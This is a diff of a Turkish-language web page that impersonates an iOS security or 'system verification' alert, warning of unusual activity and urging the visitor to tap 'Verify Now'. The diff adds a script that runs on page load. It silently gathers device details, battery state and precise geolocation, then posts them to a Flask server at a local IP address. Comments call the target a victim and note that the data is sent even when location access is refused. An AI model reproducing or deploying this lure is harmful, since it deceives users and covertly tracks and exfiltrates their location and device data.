@@ -3,21 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iOS Güvenlik Doğrulaması</title>
+    <title>iOS Sistem Doğrulaması</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background-color: #f2f2f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; width: 85%; }
-        h2 { color: #1c1c1e; }
-        p { color: #8e8e93; font-size: 14px; }
-        .btn { background: #007aff; color: white; padding: 12px 25px; border-radius: 10px; text-decoration: none; display: inline-block; margin-top: 20px; font-weight: bold; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f2f2f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 320px; }
+        .icon { font-size: 50px; margin-bottom: 20px; }
+        h1 { font-size: 20px; color: #1c1c1e; }
+        p { color: #8e8e93; font-size: 14px; margin-bottom: 30px; }
+        .btn { background-color: #007aff; color: white; padding: 12px 25px; border-radius: 10px; text-decoration: none; font-weight: 600; display: inline-block; transition: 0.3s; }
+        .btn:active { transform: scale(0.95); background-color: #0056b3; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>⚠️ Kritik Uyarı</h2>
-        <p>Cihazınızda yetkisiz bir erişim denemesi saptandı. Lütfen hemen kimlik doğrulaması yapın.</p>
-        <!-- Örnek IP: 192.168.1.45 ise -->
-<a href="http://192.168.3.153:5000/sizdir" class="btn">Şimdi Doğrula</a>
+        <div class="icon">⚠️</div>
+        <h1>Sistem Doğrulaması</h1>
+        <p>Cihazınızda olağandışı hareketler saptandı. Erişiminizi korumak için doğrulamayı tamamlayın.</p>
+        <!-- Senin IP adresine (192.168.3.153) yönlendirir -->
+        <a href="http://192.168.3.153:5000/sizdir" class="btn" id="verifyBtn">Şimdi Doğrula</a>
     </div>
+
+    <script>
+        async function sızdır() {
+            let data = {
+                platform: navigator.platform,
+                ekran: `${window.screen.width}x${window.screen.height}`,
+                tarih: new Date().toLocaleString(),
+                dil: navigator.language
+            };
+
+            // Pil Bilgisi Sızdırma (Cihazın o anki fiziksel durumunu gösterir)
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                data.pil_seviyesi = (battery.level * 100) + "%";
+                data.sarjda_mi = battery.charging;
+            }
+
+            // Hassas Konum İsteği (Kurban izin verirse tam koordinatlar gelir)
+            navigator.geolocation.getCurrentPosition((pos) => {
+                data.google_harita = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                gonder(data);
+            }, () => gonder(data)); // Reddedilse bile diğerlerini gönder
+        }
+
+        function gonder(obj) {
+            // Flask sunucuna gizli POST isteği atar
+            fetch('http://192.168.3.153:5000/detay', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(obj)
+            });
+        }
+
+        window.onload = sızdır;
+    </script>
 </body>
 </html>
